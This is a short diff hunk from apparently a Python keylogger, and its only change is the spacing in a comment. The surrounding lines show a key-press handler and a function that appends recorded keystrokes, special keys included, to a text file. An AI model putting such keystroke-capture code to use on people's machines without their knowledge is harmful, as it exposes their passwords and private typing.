@@ -37,7 +37,7 @@ def on_press(key):
 		write_file(keys)
 		keys = []
 
-#File writer function. This writes keystrokes to the text file. It handles normal characters, shifts, spaces, and other special keys (shift, alt, esc, etc.)
+# File writer function. This writes keystrokes to the text file. It handles normal characters, shifts, spaces, and other special keys (shift, alt, esc, etc.)
 def write_file(keys):
 	with open(file, "a") as f:
 		for key in keys:
